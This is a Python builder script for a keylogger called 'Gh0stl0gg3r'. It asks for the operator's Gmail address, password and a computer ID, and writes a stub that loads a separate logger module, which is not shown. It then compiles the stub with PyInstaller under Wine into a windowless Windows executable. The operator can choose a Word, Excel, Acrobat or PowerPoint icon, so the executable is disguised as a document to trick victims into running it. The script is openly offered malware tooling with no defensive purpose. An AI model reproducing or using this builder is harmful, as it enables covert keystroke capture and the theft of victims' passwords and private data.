#!/usr/bin/python3
# -*- coding: utf-8 -*-

#standard library imports
import os
import sys
from time import sleep

def logo():
    #print logo for 3 seconds
    os.system('clear')
    print('\n\n\t\t\t        00010000    10001100        ')
    print('\t\t\t    011101010010    011011001010    ')
    print('\t\t\t  110000100110000  110000000001000  ')
    print('\t\t\t  000110100100000  100011101110001  ')
    print('\t\t\t  011000010101111  100101010011101  ')
    print('\t\t\t   10001111100011  11101000100111   ')
    print('\t\t\t           100010  0010             ')
    print('\t\t\t              001   00              ')
    print('\t\t\t  01         1101  0010         11  ')
    print('\t\t\t 000110001110010    110101110010111 ')
    print('\t\t\t100101000010110       0100011001001 ')
    print('\t\t\t10000111110101        0111001010001 ')
    print('\t\t\t  010011101100110  0011100010110    ')
    print('\t\t\t    1100110111011  000010000110     ')
    print('\t\t\t       0110100011  01100101111      ')
    print('\t\t\t         10111 10  10 11101         ')
    print('\t\t\t          0010  1  1  1101          ')
    print('\t\t\t            10        10        \n\n')
    print('\t\t\t              Gh0stc0d3         \n\n')
    sleep(3)


def pyinstaller():
    os.system('wine /root/.wine/drive_c/Python34/python.exe /root/.wine/drive_c/Python34/Scripts/pyinstaller-script.py --noconfirm --noconsole -F keylogger.py')
    os.system('rm -Rf build __pycache__ keylogger.spec keylogger.py')


def pyinstaller_icon(icon):
    os.system('wine /root/.wine/drive_c/Python34/python.exe /root/.wine/drive_c/Python34/Scripts/pyinstaller-script.py --noconsole -i icons/{0}.ico -F keylogger.py'.format(str(icon)))
    os.system('rm -Rf build __pycache__ keylogger.spec keylogger.py')


def choose():
    print('\n\n\na = No icon')
    print('\nb = Word icon')
    print('\nc = Excel icon')
    print('\nd = Acrobat icon')
    print('\ne = Powerpoint icon')
    op = input('\nchoose your icon for pyinstaller: ')
    if op == 'a':
        pyinstaller()
    elif op == 'b':
        pyinstaller_icon('word')
    elif op == 'c':
        pyinstaller_icon('excel')
    elif op == 'd':
        pyinstaller_icon('acrobat')
    elif op == 'e':
        pyinstaller_icon('powerpoint')
    else:
        os.system('clear')
        print ('\t\t{0} its not a valid option, try again!!'.format(op))
        choose()


def start():
    if not os.geteuid() == 0:
        sys.exit('\n\n\tGh0stl0gg3r must be run as root')
    os.system('sudo rm -Rf dist')
    print('\n\tYou must activate "allow less secure apps" in your Gmail account\n')
    mail = input('\nenter your Gmail: ')
    clave = input('type your password: ')
    id = input('type computer ID: ')
    os.system('clear')
    print('\n\n101010101010101010101010101010101010101010101010101010101010')
    print('\n\Mail = {0}, Pass = {1}, Computer Id = {2}\n'.format(str(mail), str(clave), str(id)))
    print('\n101010101010101010101010101010101010101010101010101010101010\n\n')
    check = input('\n\tits correct? type (y)es or (n)o: ')
    os.system('clear')
    if check == 'y':
        file = '#!/usr/bin/python3\n# -*- coding: utf-8 -*-\n\n'
        file += 'import logger\n\n'
        file += 'gh0stl0gg3r = logger.L0gg3r("{0}", "{1}", "{2}")\n'.format(str(mail), str(clave), str(id))
        file += 'gh0stl0gg3r.start()'
        with open('keylogger.py', 'w') as f:
            f.write(file)
            f.close()
        choose()
        sleep(3)
        os.system('clear')
        print('\n\n\tIf everything was Ok you file will be in "dist" directory')
        print('\n\t10101010101THANKS10FOR01USING01GH0STL0GG3R101010101010101')
    else:
        start()


logo()
start()